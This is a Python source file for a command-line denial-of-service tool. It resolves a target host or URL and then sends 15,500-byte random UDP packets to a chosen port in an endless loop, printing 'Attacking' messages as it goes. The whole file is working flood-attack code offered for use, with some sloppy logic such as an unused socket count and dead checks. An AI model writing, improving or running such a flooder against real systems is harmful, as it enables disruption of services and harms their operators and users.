from socket import socket, AF_INET, SOCK_DGRAM, gethostname, gethostbyname
from argparse import ArgumentParser
from sys import argv
from time import strftime
from os import system
from src import banner

def cls():
    system('cls||clear')

#

import random

def call_ban():
    print(banner.banner())

class args():
    def arg():
        parser = ArgumentParser()
        parser.add_argument(
            "--http",
            nargs = "*",
            help = "Attack https://<host>"
        )
        parser.add_argument(
            "-i",
            "--ip",
            nargs="?", 
            help="Host to attack."
        )
        parser.add_argument(
        "-p", 
        "--port", 
        default=80, 
        help="Port of webserver, usually 80", 
        type=int
        )
        parser.add_argument(
        "-s",
        "--sockets",
        default=150,
        help="Number of sockets to use in the test",
        type=int,
        )
        args = parser.parse_args()

        if len(argv) <= 1:
            parser.print_help()
            exit(1)

        if args.http and args.sockets:
            if not args.http:
                print('http website required!')
                print('Quitting!')
                exit(1) 
            for i in args.http:
                if 'https://' in i:
                    a = i.replace(i[0:8], "")
                    if '/' in a:
                        d = a.replace(a[-1], "")
                ip=gethostbyname(d)
                call_ban()
                try: 
                    print(strftime(f'['+'%X'+f'] Attacking: {ip}:{args.port} using sockets: {args.sockets}'))
                    dos(ip=ip, port=args.port, socks=args.sockets)
                except:
                    print('an error has been ocurred!')
                    exit(1)

        if args.ip:
            if not args.ip:
                print('Host required!')
                parser.print_help()
                exit(1)

        if args.ip and args.sockets:
            if args.sockets > 100000:
                print('many sockets added. Your dos attack will be ignored.')
                print('quitting.')
                exit(1)
            call_ban()
            try: 
                print(strftime(f'['+'%X'+f'] Attacking: {args.ip}:{args.port} using sockets: {args.sockets}'))
                dos(ip=args.ip, port=args.port, socks=args.sockets)
            except KeyboardInterrupt:
                print('\nQuitting.')
                exit(1)
            except:
                print('\nOcurred an error!')
                exit(1)

def dos(ip, port, socks):
    lib = socket(AF_INET, SOCK_DGRAM)
    packs = random._urandom(15500)
    ip1 = ip
    porta = port
    env = socks
    while True:
        lib.sendto(packs, (ip1,porta))
        env +=1000

# Init program.
if __name__ == "__main__":
    args.arg()
